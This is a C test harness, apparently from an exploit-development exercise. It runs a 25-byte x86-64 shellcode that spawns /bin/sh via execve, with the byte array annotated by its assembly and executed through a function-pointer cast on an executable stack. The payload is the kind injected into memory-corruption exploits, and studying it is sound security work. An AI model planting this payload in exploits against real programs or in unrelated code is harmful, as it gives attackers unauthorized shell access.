/*
 * test_shellcode.c - Shellcode test wrapper (Phase 2)
 *
 * Compilation:
 *   gcc -z execstack -o test_shellcode test_shellcode.c
 *
 * This program executes a shellcode that spawns /bin/sh
 * via execve syscall (x86-64).
 */

#include <stdio.h>
#include <string.h>

/*
 * Shellcode: execve("/bin//sh", NULL, NULL) - 25 bytes
 *
 * Assembly:
 *   xor    rsi, rsi          ; rsi = 0 (argv = NULL)
 *   push   rsi               ; push 0 (string terminator)
 *   mov    rdi, 0x68732f2f6e69622f  ; rdi = "/bin//sh"
 *   push   rdi               ; push "/bin//sh" onto stack
 *   push   rsp               ; push address of string
 *   pop    rdi               ; rdi = pointer to "/bin//sh"
 *   xor    rdx, rdx          ; rdx = 0 (envp = NULL)
 *   mov    al, 59            ; rax = 59 (syscall number for execve)
 *   syscall                  ; execve("/bin//sh", NULL, NULL)
 */
unsigned char shellcode[] =
    "\x48\x31\xf6"             /* xor    rsi, rsi           */
    "\x56"                     /* push   rsi                */
    "\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
                               /* movabs rdi, 0x68732f2f6e69622f */
    "\x57"                     /* push   rdi                */
    "\x54"                     /* push   rsp                */
    "\x5f"                     /* pop    rdi                */
    "\x48\x31\xd2"             /* xor    rdx, rdx           */
    "\xb0\x3b"                 /* mov    al, 59             */
    "\x0f\x05";                /* syscall                   */

int main(void)
{
    printf("Shellcode length: %zu bytes\n", strlen((char *)shellcode));
    printf("Executing shellcode...\n");

    /* Cast shellcode array to function pointer and call it */
    ((void (*)(void))shellcode)();

    /* Should not reach here */
    printf("Shellcode execution failed!\n");
    return 1;
}
